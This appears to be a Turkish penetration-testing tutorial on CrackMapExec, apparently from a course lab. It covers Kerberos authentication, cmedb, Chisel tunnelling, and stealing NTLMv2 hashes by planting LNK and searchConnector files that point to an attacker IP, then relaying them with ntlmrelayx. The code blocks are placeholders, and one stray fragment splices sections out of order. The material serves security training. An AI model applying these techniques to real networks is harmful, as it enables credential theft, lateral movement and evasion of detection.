Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'print

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
